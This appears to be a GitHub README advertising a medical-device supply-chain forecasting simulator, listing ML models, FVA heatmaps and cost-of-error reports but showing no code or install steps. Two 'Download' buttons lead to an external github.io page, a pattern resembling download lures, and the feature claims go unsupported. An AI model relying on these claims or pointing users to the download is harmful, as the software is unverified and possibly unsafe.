![preview](https://raw.githubusercontent.com/KillerM1000/MedDev-Forecast-Infra/main/preview.svg)

# Supply Chain Horizon: Multi‑Scenario Forecast Simulator for Med‑Device Networks

## Overview

Forecasting in a medical device supply chain is not about guessing—it is about engineering resilience. **Supply Chain Horizon** is a modular, simulation‑driven platform that evaluates forecast accuracy across thousands of “what‑if” scenarios, not just historical MAPE and Bias. Inspired by the need to move beyond backward‑looking metrics, this repository equips supply chain analysts with a structured environment to stress‑test demand signals, compare machine learning model families (Prophet, XGBoost, LSTM), and generate actionable FVA (Forecast Value Added) heatmaps—all without any single point of failure.

This is not a dashboard. It is a **scenario engine** that quantifies the cost of forecast error and the value of alternative methods, expressed in units of inventory risk, service level erosion, and expedited freight spend. The codebase is designed to be audited, extended, and integrated with existing ERP (SAP, Oracle) outputs.

[![Download](https://raw.githubusercontent.com/KillerM1000/MedDev-Forecast-Infra/main/button.svg)](https://killerm1000.github.io/MedDev-Forecast-Infra/)

---

## Table of Contents

- [Core Philosophy](#core-philosophy)
- [Key Features](#key-features)
- [Architecture & Data Flow](#architecture--data-flow)
- [Simulation Methodology](#simulation-methodology)
- [ML Modeling Module](#ml-modeling-module)
- [Scenario Outcomes & Reporting](#scenario-outcomes--reporting)
- [Responsive UI & Multilingual Support](#responsive-ui--multilingual-support)
- [24/7 Customer Support](#247-customer-support)
- [Disclaimer](#disclaimer)
- [License](#license)

---

## Core Philosophy

Most forecast accuracy projects stop at dashboards that show error rates. **Supply Chain Horizon** asks *“What if the forecast error had been reduced by 15% using a different segmentation?”* or *“Which product families exhibit non‑stationary demand that invalidates any single metric?”*  

The platform treats each forecast method as a controlled experiment. You run a baseline (e.g., company’s current statistical forecast) and then inject **counterfactual methods**—ensemble ML, informed judgment, damped trend—and compare outcomes side‑by‑side. The result is not a chart; it is a **decision‑ready comparison table** tied to expected inventory turnover and write‑off exposure.

---

## Key Features

### 1. Multi‑Scenario Simulation Engine (MSE)
- Supports up to 50 parallel forecast scenarios per run.
- Configure demand volatility, lead time variance, and substitution effects.
- Captures **MAPE, Bias, MAE, RMSSE** for each scenario.

### 2. Forecast Value Added (FVA) Heatmap
- Automatically compares each method against a naive benchmark.
- Visualizes which forecast steps add or destroy value across SKU families.
- Outputs a ranked list of methods by net supply chain cost impact.

### 3. ML Model Library (Containerized)
- **Prophet** for seasonality decomposition, **XGBoost** for feature‑rich demand, **LSTM** for high‑frequency repairable items.
- Each model comes with pre‑trained hyperparameter defaults for medical device patterns (e.g., 18‑month season cycles, regulatory launch peaks).
- Models produce **prediction intervals** (80% / 95%), not point estimates.

### 4. Scenario Comparison Dashboard
- A single HTML dashboard (no external server required) with:
  - Overlaid forecast lines per product family
  - Cumulative error waterfall chart
  - Inventory risk table (days of excess + days of shortage)
- Forkable to Power BI or Excel via CSV/JSON export.

### 5. Data Quality Pre‑Processor
- Detects and flags: zero‑demand spells, outlier spikes (MAD > 5), calendar effects (public holidays, hospital purchasing cycles).
- Generates a **data completeness score** per SKU before any forecasting begins.

### 6. Cost of Error Calculator
- Converts error metrics into financial terms:  
  `(excess inventory carrying cost + expedited freight cost + opportunity cost of stockout)`
- Uses industry benchmarks from MedTech studies.

### 7. Responsive UI & Multilingual Support
- Built with **React + Tailwind CSS** – responsive across desktop, tablet, and mobile.
- Interface language auto‑detects (English, Spanish, Mandarin, German, French, Portuguese).
- Translations are community‑maintained via `.json` locale files.

### 8. 24/7 Customer Support
- Embedded in‑app documentation browser (no internet needed).
- GitHub Issues tracked as feature requests and bug reports.
- Simulation logs auto‑tagged with UUID for traceability.

---

## Architecture & Data Flow

```text
User Input (CSV/ Excel)  
        │  
[Data Quality Pre‑Processor]  
        │  
[Scenario Configurator] (select baseline + counterfactual methods)  
        │  
[Simulation Engine] (parallel execution – Python multiprocessing)  
        │  
├── Prophet  
├── XGBoost  
├── LSTM  
└── Statistical Baseline  
        │  
[Metric Aggregator] (MAPE, Bias, RMSSE, Cost Impact)  
        │  
[FVA Comparator]  
        │  
[Scenario Dashboard Generator]  
        │  
Output: HTML / JSON / CSV / Power BI compatible
```

All intermediate artifacts (predictions, metrics, logs) are stored in a flat folder hierarchy—no database required. The simulation engine runs on the user’s machine or a simple cloud function.

---

## Simulation Methodology

Each scenario is built around a **three‑step decomposition**:

1. **Baseline Calibration** – User provides at least 24 months of historical demand. The platform auto‑detects seasonality (Winters‑Holt, Fourier terms).
2. **Alternative Generation** – For each selected ML method, the engine trains on a rolling window (12 months), forecasts the next 3 months, then slides forward.
3. **Metric Aggregation** – Metrics are weighted by:
   - Volume (high‑revenue SKUs get higher weight)
   - Lead time sensitivity
   - Criticality (based on user‑defined ABC/XYZ classification)

The simulation also offers **stress tests** (e.g., 20% demand drop, 2‑week port closure) to assess robustness of each method under disruption.

---

## ML Modeling Module

### Prophet
- Best for: stable, seasonal, repairable medical devices (pulse oximeters, infusion pumps).
- Automatically detects changepoints (e.g., new product launch).
- Output: trend, weekly/monthly seasonality, holiday effects.

### XGBoost
- Best for: high‑dimensional data (promotions, backorders, patient admission data).
- Feature engineering includes: lag demand (1, 3, 6 months), moving averages, relative price index.
- Handles missing values robustly.

### LSTM
- Best for: non‑stationary, high‑frequency (daily) demand for surgical consumables.
- Two‑layer architecture with dropout (0.2) and early stopping.
- Input sequence length: 60 days.

All models are packaged with a `predict()` method that returns:
```json
{
  "forecast": [ ... ],
  "lower_bound_80": [ ... ],
  "upper_bound_80": [ ... ],
  "lower_bound_95": [ ... ],
  "upper_bound_95": [ ... ],
  "model_metadata": {
    "training_mape": 12.3,
    "state": "trained"
  }
}
```

---

## Scenario Outcomes & Reporting

After running a simulation, the user receives a **Summary Decision Report** (PDF or HTML) containing:

| Section | Content |
|---------|---------|
| **Executive Summary** | Best method per SKU group, weighted MAPE reduction, cost avoidance |
| **FVA Matrix** | Each forecast step rated (+/-/neutral) vs. naïve |
| **Inventory Risk Table** | Days of excess / shortage per scenario |
| **Cost Impact Table** | Carrying cost + expedited freight + lost revenue opportunity |
| **Visual Annex** | Overlay plots, cumulative error waterfall, error distribution histograms |

The dashboard also includes a **Scenario Comparison Slider** – move from baseline to optimal method and watch inventory risk change in real time.

---

## Responsive UI & Multilingual Support

The interface is built for field supply chain managers who access data on tablets in warehouses, or analysts on desktops. The design follows these principles:

- **Mobile‑first**: All tables collapse to cards on screens under 768px.
- **Locale detection**: Language preference stored in localStorage; defaults to browser language.
- **Translation files** are located in `locales/` – each file maps UI strings to one language.
- **Accessibility**: WCAG 2.1 AA compliant (contrast, keyboard navigation, ARIA labels).
- **Zero external fonts used** – system fonts only, for fast loading even offline.

---

## 24/7 Customer Support

- **Documentation site** (static, hosted alongside code) – includes full API reference, step‑by‑step tutorials, FAQ.
- **GitHub Discussions** enabled for community Q&A.
- **Automated log collection**: every simulation produces a `.log` file with UUID. Manual support can recreate any run.
- **Simulation health check** – periodic validation of model outputs (e.g., consistency checks, NaN detection).

---

## Disclaimer

This repository and all its contents are provided for **educational and research purposes only**. The authors make no claim about the accuracy, fitness, or timeliness of any forecast generated by these scripts. Medical device supply chains involve regulatory, contractual, and patient‑safety considerations that cannot be fully captured by any simulation model. Users should:
- Validate outputs against domain expertise.
- Not base critical inventory or procurement decisions solely on these outputs.
- Maintain independent verification processes.

The project is not affiliated with any medical device manufacturer, regulatory body, or ERP vendor.

---

## License

Distributed under the **MIT License**. You are free to use, modify, and distribute this code, provided the original copyright notice appears in all copies.  

[View License](https://opensource.org/licenses/MIT)

© 2026 Supply Chain Horizon

---

[![Download](https://raw.githubusercontent.com/KillerM1000/MedDev-Forecast-Infra/main/button.svg)](https://killerm1000.github.io/MedDev-Forecast-Infra/)